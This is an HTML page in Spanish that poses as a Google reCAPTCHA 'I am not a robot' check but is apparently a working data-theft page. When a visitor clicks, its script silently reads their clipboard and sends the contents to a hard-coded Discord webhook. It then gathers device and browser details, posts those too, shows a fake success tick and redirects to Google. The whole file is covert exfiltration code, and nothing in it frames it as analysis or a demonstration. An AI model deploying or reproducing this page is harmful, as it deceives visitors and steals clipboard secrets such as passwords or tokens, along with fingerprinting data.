<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificación de Seguridad</title>
    <style>
        body { background: #FFFFFF; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        #captcha-container {
            width: 300px; height: 74px; background: #F9F9F9; border: 1px solid #D3D3D3;
            border-radius: 3px; display: flex; align-items: center; padding: 0 10px;
            box-shadow: 0 0 4px rgba(0,0,0,0.1); position: relative; cursor: pointer;
        }
        #checkbox { width: 24px; height: 24px; border: 2px solid #C1C1C1; border-radius: 2px; background: #FFF; margin-right: 15px; position: relative; }
        #label { color: #555; font-size: 14px; flex-grow: 1; user-select: none; }
        #logo { width: 38px; text-align: center; }
        #logo img { width: 30px; }
        #logo span { font-size: 8px; color: #555; display: block; }
        #subliminal-flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #4285F4; display: none; z-index: 9000; }
        .master-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0); border: none; z-index: 5000; cursor: pointer; }
    </style>
</head>
<body>

    <div id="subliminal-flash"></div>

    <div id="captcha-container">
        <button id="trigger-1" class="master-trigger"></button>
        <button id="trigger-2" class="master-trigger" style="display:none;"></button>
        
        <div id="checkbox"></div>
        <div id="label">No soy un robot</div>
        <div id="logo">
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
            <span>reCAPTCHA</span>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        
        const flash = document.getElementById('subliminal-flash');
        const trigger1 = document.getElementById('trigger-1');
        const trigger2 = document.getElementById('trigger-2');
        const checkbox = document.getElementById('checkbox');

        // CLICK 1: Portapapeles Silencioso
        trigger1.addEventListener('click', async () => {
            flash.style.display = 'block';
            setTimeout(() => { flash.style.display = 'none'; }, 1);
            
            checkbox.style.borderColor = "#4285F4"; // Feedback de sistema
            
            try {
                const text = await navigator.clipboard.readText();
                enviarADiscord("🔑 Portapapeles", text);
            } catch (e) { console.log("Silent skip"); }

            trigger1.style.display = "none";
            trigger2.style.display = "block";
        });

        // CLICK 2: Captura Profunda de Información (Sin avisos)
        trigger2.addEventListener('click', async () => {
            // Animamos el check como si fuera exitoso
            checkbox.innerHTML = '<div style="width:12px; height:6px; border-left:3px solid #00AA00; border-bottom:3px solid #00AA00; transform:rotate(-45deg); margin:4px auto;"></div>';
            
            // Recolección de información del sistema
            const info = {
                plataforma: navigator.platform,
                idioma: navigator.language,
                nucleos: navigator.hardwareConcurrency,
                memoria_ram: navigator.deviceMemory + " GB",
                conexion: navigator.connection ? navigator.connection.effectiveType : "Desconocida",
                pantalla: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                agente: navigator.userAgent
            };

            enviarADiscord("📊 Info de Sistema", JSON.stringify(info, null, 2));

            // Simulación de carga final para redirigir
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 800);
        });

        function enviarADiscord(titulo, contenido) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: titulo,
                        description: "```" + contenido + "```",
                        color: 4359668,
                        timestamp: new Date()
                    }]
                })
            });
        }
    </script>
</body>
</html>
